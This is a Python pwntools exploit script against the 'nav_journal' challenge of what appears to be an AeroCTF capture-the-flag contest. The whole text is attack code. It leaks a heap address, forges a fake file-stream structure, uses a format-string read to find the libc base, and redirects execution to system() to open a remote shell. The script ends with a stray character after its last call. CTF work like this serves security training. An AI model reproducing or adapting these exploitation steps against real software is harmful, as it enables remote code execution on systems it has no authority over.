from pwn import *

#context.log_level = 'debug'

#p = process('./nav_journal')
p = remote('tasks.aeroctf.com', 33013)

p.sendafter(':', 'a'*0x10)
#p.sendafter(':', 'a'*0x44+p32(0xf7599da0)+'a'*0x4)
#p.sendafter(':', 'a'*0x44+p32(0xf7e54da0)+'a'*0x4)
p.sendlineafter('>', '1')
p.sendlineafter('>', '6')

p.recvuntil('\x00'*0x600)
heap = u32(p.recv(4))
print 'HEAP : ' +hex(heap)

p.sendlineafter('>', '5')

pay = 'sh\x00\x00'+p32(0)*13
pay += p32(3)+p32(0)*3
pay += p32(heap-0x600)+p32(0xffffffff)*2
pay += p32(0)+p32(heap-0x600)+p32(0)*14
pay += p32(0x0804c120) # name
pay = pay.ljust(0x600, '\x00')

p.sendafter(':', pay+p32(heap-0x610))

p.sendlineafter('>', '4')
p.sendlineafter(':', 'N')
p.sendafter(':', '%20$p')
p.recvuntil('0x')

libc = int(p.recv(8), 16) - 0x1b2000
print hex(libc)

p.sendlineafter('>', '8')
p.sendafter(':', 'a'*0x44+p32(libc+0x3ada0)+'a'*4)
p.sendlineafter('>', '3')


p.interactive()w
